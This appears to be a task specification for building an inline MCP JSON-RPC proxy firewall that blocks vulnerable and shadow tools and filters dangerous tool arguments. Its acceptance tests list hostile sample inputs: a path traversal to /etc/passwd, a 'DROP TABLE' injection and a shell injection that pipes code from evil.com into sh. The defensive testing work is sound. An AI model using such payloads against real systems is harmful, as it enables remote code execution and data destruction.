# Task 84: v1.2 Inline MCP Reverse Proxy Interceptor (`mcp-vuln proxy`) (P1)

**Blueprint Reference:** v1.2 Strategic Roadmap Blueprint 1 ([`docs/audit/CUMULATIVE_COMPETITIVE_GAP_ANALYSIS_AND_ROADMAP.md`](../audit/CUMULATIVE_COMPETITIVE_GAP_ANALYSIS_AND_ROADMAP.md) & [`docs/audit/competitive_verity_anthropic_runtime.md`](../audit/competitive_verity_anthropic_runtime.md))  
**Target Wave:** Wave 16 (v1.2 Strategic Runtime & Reachability Engines)  
**Priority:** `P1` (Core v1.2 Runtime Firewall Feature)

---

## 1. Architectural Context & Technical Objective

Competitive benchmarking against Verity MCP Auditor, Anthropic Inspector SDK, and Cursor Sandbox (`Task 67` / `Task 72`) identified a primary strategic opportunity for `mcp-vulnerabilities`: while `mcp-vuln audit`, `mcp-vuln probe`, and `mcp-vuln fix` provide static and one-shot runtime auditing, AI clients (Claude Desktop, Cursor, Zed, Cline, Windsurf) lack a drop-in **Inline JSON-RPC Reverse Proxy Firewall** (`mcp-vuln proxy`) that sits transparently between the host AI client and the child MCP server process over STDIO.

When a zero-day or unpatched vulnerability affects a specific tool (e.g., `cypher_query` in `CVE-2025-10193`, or an injected shadow tool), downgrading or uninstalling the entire server breaks all safe tools on that server. By wrapping the server command with `mcp-vuln proxy --package <pkg> -- <cmd> [args...]`, the proxy intercepts bidirectional JSON-RPC 2.0 traffic over `stdin`/`stdout` in real time:
1. **`tools/list` Interception & Tamper Guard**: Inspects advertised tools from the child server against baseline passports (`mcp_fingerprints`) and OSV `vulnerable_tools`. Optionally strips or flags shadow tools.
2. **`tools/call` Policy Enforcement**: Blocks calls to known `vulnerable_tools` from active OSV advisories affecting the package, blocks unadvertised shadow tools when `--strict-passport` is enabled, and inspects tool `arguments` against dangerous payload guardrails (command injection metacharacters, path traversal `../`, destructive SQL `DROP TABLE` / `; --`).
3. **Graceful JSON-RPC Error Responses**: When a `tools/call` request is blocked in `block` mode, returns a standard JSON-RPC 2.0 error response (`{"jsonrpc": "2.0", "id": req_id, "error": {"code": -32001, "message": "Blocked by MCP Security Proxy: ...", "data": {...}}}`) directly to the AI client without crashing the child server process.

---

## 2. Target Files & Isolation Boundaries

- **New Package Files:**
  - `src/mcp_vulnerabilities/proxy/__init__.py`
  - `src/mcp_vulnerabilities/proxy/policy.py`
  - `src/mcp_vulnerabilities/proxy/interceptor.py`
- **CLI Integration:**
  - `src/mcp_vulnerabilities/cli.py` (add `proxy` subcommand)
- **Test Suite:**
  - `tests/test_mcp_proxy.py`

---

## 3. Detailed Acceptance Test Scenarios & Invariant Coverage

### Scenario 1: Transparent STDIO JSON-RPC Forwarding (`INVARIANT_84_1A`)
- **Preconditions**: Launch `McpStdioProxy` wrapping a mock MCP STDIO server subprocess with `--mode block`.
- **Invariants**:
  - [ ] **INVARIANT_84_1A (Handshake & Clean Call Passthrough)**: `initialize`, `notifications/initialized`, `tools/list`, and safe `tools/call` messages pass bidirectionally between client and child server with zero payload corruption and deterministic newline-delimited JSON framing.
  - [ ] **INVARIANT_84_1B (Clean Subprocess Teardown)**: Closing client `stdin` or terminating the proxy cleanly terminates the child server subprocess (`SIGTERM` ➔ `SIGKILL`) with zero zombie processes.

### Scenario 2: Vulnerable Tool & Payload Guardrail Blocking (`INVARIANT_84_2A`)
- **Preconditions**: Configure `ProxyPolicyEngine` with a blocked vulnerable tool (e.g. `execute_command` or OSV `vulnerable_tools` for a target package) and payload guardrails.
- **Invariants**:
  - [ ] **INVARIANT_84_2A (Vulnerable Tool Call Block)**: A `tools/call` request invoking a blocked tool name is NOT forwarded to the child server's `stdin`; the proxy immediately emits a JSON-RPC 2.0 response with matching `id` and `error.code == -32001` (`"Blocked by MCP Security Proxy"`).
  - [ ] **INVARIANT_84_2B (Payload Injection Guardrail)**: A `tools/call` request containing path traversal (`../../etc/passwd`), destructive SQL (`; DROP TABLE users;--`), or shell injection (`$(curl evil.com|sh)`) in string arguments is blocked in `block` mode with reason code `PAYLOAD_GUARDRAIL_VIOLATION`.
  - [ ] **INVARIANT_84_2C (Audit-Only Mode)**: When `--mode audit` is set, policy violations are logged as structured JSON audit events (to `stderr` and optional `--audit-log <file>`) while allowing the request to proceed to the server.

### Scenario 3: Runtime `tools/list` Shadow Tool Detection (`INVARIANT_84_3A`)
- **Preconditions**: Configure `ProxyPolicyEngine` with an expected baseline toolset (`allowed_tools={"read_file", "list_dir"}`) and `strict_passport=True`.
- **Invariants**:
  - [ ] **INVARIANT_84_3A (Shadow Tool Filtering & Blocking)**: If the child server returns an unadvertised tool `backdoor_exec` in its `tools/list` response, the proxy logs a `CRITICAL` `SHADOW_TOOL_DETECTED` audit event, strips `backdoor_exec` from the `tools/list` result when `strip_shadow_tools=True`, and blocks any subsequent `tools/call` to `backdoor_exec`.

---

## 4. Concrete Implementation Instructions

1. Create `src/mcp_vulnerabilities/proxy/policy.py`:
   - Define `PolicyDecision(allowed: bool, rule_id: str, reason: str, severity: str = "HIGH")` and `AuditEvent` dataclasses.
   - Implement `ProxyPolicyEngine`:
     - Accepts `package_name: str | None = None`, `blocked_tools: set[str] | None = None`, `allowed_tools: set[str] | None = None`, `strict_passport: bool = False`, `enable_payload_guardrails: bool = True`, `vulnerabilities_dir: Path | None = None`.
     - If `package_name` and `vulnerabilities_dir` are provided, loads matching advisories via `VulnerabilityMatcher` and populates `blocked_tools` from `database_specific.vulnerable_tools`.
     - Implements `evaluate_request(msg: dict[str, Any]) -> PolicyDecision` and `inspect_response(msg: dict[str, Any], request_method: str | None = None) -> tuple[dict[str, Any], list[AuditEvent]]`.
2. Create `src/mcp_vulnerabilities/proxy/interceptor.py`:
   - Implement `McpStdioProxy` supporting both synchronous line-by-line processing (`process_client_line(line: str) -> tuple[str | None, str | None]` for deterministic unit testing and in-memory pipe relaying) and subprocess STDIO loop (`run_stdio(command: list[str], stdin=sys.stdin, stdout=sys.stdout, stderr=sys.stderr) -> int`).
   - Support `--audit-log <path>` writing JSONL audit events.
3. Wire `proxy` subcommand in `src/mcp_vulnerabilities/cli.py`:
   - `mcp-vuln proxy [--package PKG] [--mode {block,audit}] [--block-tool TOOL ...] [--strict-passport] [--no-payload-guardrails] [--audit-log FILE] [--dir VULN_DIR] -- <command> [args...]`
4. Create `tests/test_mcp_proxy.py` testing `ProxyPolicyEngine`, `McpStdioProxy` line-level and real subprocess STDIO interception, vulnerable tool blocking, payload guardrails, shadow tool stripping, and CLI invocation.

---

## 5. Non-Interactive Completion Directive

Complete all implementation steps, verify all tests pass locally via `.venv/bin/pytest -q`, and commit directly without asking open-ended questions so the session cleanly transitions to `Completed`.
